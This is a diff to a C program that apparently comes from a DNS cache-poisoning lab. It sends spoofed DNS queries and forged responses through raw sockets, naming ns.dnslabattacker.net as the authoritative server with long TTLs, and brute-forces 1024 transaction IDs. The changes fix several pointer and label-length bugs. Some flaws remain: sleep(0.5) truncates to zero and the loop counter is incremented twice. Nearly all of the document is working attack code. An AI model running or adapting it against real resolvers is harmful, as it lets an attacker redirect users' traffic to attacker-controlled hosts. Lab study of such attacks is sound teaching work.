@@ -142,9 +142,10 @@ void query(char* fake_domain_name, char* local_ip_addr, char* local_dns_addr) {
     // dns fields(UDP payload field)
     // relate to the lab, you can change them. begin:
     ////////////////////////////////////////////////////////////////////////
+    dns->query_id=rand(); // transaction ID for the query packet, use random #
 
     //The flag you need to set
-    dns->flags=htons(FLAG_R); // zz: no-error answer
+    dns->flags=htons(FLAG_Q); // zz: dns query
     
     //only 1 query, so the count should be one.
     dns->QDCOUNT=htons(1);
@@ -190,6 +191,11 @@ void query(char* fake_domain_name, char* local_ip_addr, char* local_dns_addr) {
     // send the packet out.
     if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&local_dns_in, sizeof(local_dns_in)) < 0)
         printf("packet send error %d which means %s\n",errno,strerror(errno));
+
+    // printf("[DEBUG] query message with length %u:\n", packetLength);
+    // for (int i = 0; i < packetLength; i++)
+    //     printf("%02x", ((unsigned char*)buffer)[i]);
+    // printf("\n");
 }
 
 void response(char* fake_domain_name, char* local_dns_addr) {
@@ -212,7 +218,6 @@ void response(char* fake_domain_name, char* local_dns_addr) {
     ////////////////////////////////////////////////////////////////////////
 
     //The flag you need to set
-    dns->query_id=rand(); // transaction ID for the query packet, use random #
     dns->flags=htons(FLAG_R); // zz: no-error answer
     
     // zz: need all question, answer, authority & additional session for response
@@ -266,15 +271,15 @@ void response(char* fake_domain_name, char* local_dns_addr) {
     current_offset += 2; // zz: 2 bytes 0x0c12
 
     struct asEnd* authns_end = (struct asEnd*)(buffer + current_offset);
-    ans_end->type = htons(2); // type: NS
-    ans_end->class = htons(1); // Class: IN
-    ans_end->ttl_l = htons(0xff); // set a long time
-    ans_end->ttl_h = htons(0xff); // set a long time
-    ans_end->datalen = htons(23); // "/2ns/14dnslabattacker/3net"
+    authns_end->type = htons(2); // type: NS
+    authns_end->class = htons(1); // Class: IN
+    authns_end->ttl_l = htons(0xff); // set a long time
+    authns_end->ttl_h = htons(0xff); // set a long time
+    authns_end->datalen = htons(23); // "/2ns/14dnslabattacker/3net"
     current_offset += sizeof(struct asEnd);
 
     char* authns_name = buffer + current_offset;
-    strcpy(authns_name, "\2ns\14dnslabattacker\3net");
+    strcpy(authns_name, "\2ns\16dnslabattacker\3net");
     int authns_name_len = strlen(authns_name) + 1; // include null end byte
     current_offset += authns_name_len;
 
@@ -282,16 +287,16 @@ void response(char* fake_domain_name, char* local_dns_addr) {
     //  zz: additional section
     // ----------------------------------------
     char *ads_name = buffer + current_offset;
-    strcpy(ads_name, "\2ns\14dnslabattacker\3net");
+    strcpy(ads_name, "\2ns\16dnslabattacker\3net");
     int ads_name_len = strlen(ads_name) + 1;
     current_offset += ads_name_len;
 
     struct asEnd* ads_end = (struct asEnd*)(buffer + current_offset);
-    ans_end->type = htons(1); // type: A
-    ans_end->class = htons(1); // Class: IN
-    ans_end->ttl_l = htons(0xff); // set a long time
-    ans_end->ttl_h = htons(0xff); // set a long time
-    ans_end->datalen = htons(4); // 4 bytes
+    ads_end->type = htons(1); // type: A
+    ads_end->class = htons(1); // Class: IN
+    ads_end->ttl_l = htons(0xff); // set a long time
+    ads_end->ttl_h = htons(0xff); // set a long time
+    ads_end->datalen = htons(4); // 4 bytes
     current_offset += sizeof(struct asEnd);
 
     char* ads_addr = buffer + current_offset;
@@ -358,11 +363,9 @@ void response(char* fake_domain_name, char* local_dns_addr) {
       ipheader_size + udpheader_size
      *********************************************************************************/
 
-    int count = 0;
-    int trans_id = 6000;
-    while (count < 256)
-    {
-        dns->query_id = trans_id + count;
+    int trans_id = rand() % 65536;
+    for (int count = 0; count < 1024; count++) { // zz: try 1024 continuous random transaction id
+        dns->query_id = (trans_id + count) % 65536;
 
         udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
 
@@ -370,7 +373,12 @@ void response(char* fake_domain_name, char* local_dns_addr) {
         if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&local_dns_in, sizeof(local_dns_in)) < 0)
             printf("packet send error %d which means %s\n", errno, strerror(errno));
         count++;
+        // printf("[DEBUG] response message with length %u:\n", packetLength);
+        // for (int i = 0; i < packetLength; i++)
+        //     printf("%02x", ((unsigned char*)buffer)[i]);
+        // printf("\n");
     }
+
 }
 
 int main(int argc, char *argv[])
@@ -444,7 +452,7 @@ int main(int argc, char *argv[])
       ipheader_size + udpheader_size
      *********************************************************************************/
 
-    char* fake_domain_name = "\5aaaaa\7example\3edu";
+    char fake_domain_name[20] = "\5aaaaa\7example\3edu";
     while(1)
     {	
         // This is to generate a different query in xxxxx.example.edu
@@ -456,6 +464,7 @@ int main(int argc, char *argv[])
 
         // udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
         query(fake_domain_name, argv[1], argv[2]);
+        sleep(0.5); // wait for the request to be sent
 	    response(fake_domain_name, argv[2]);
     }
     close(sd);
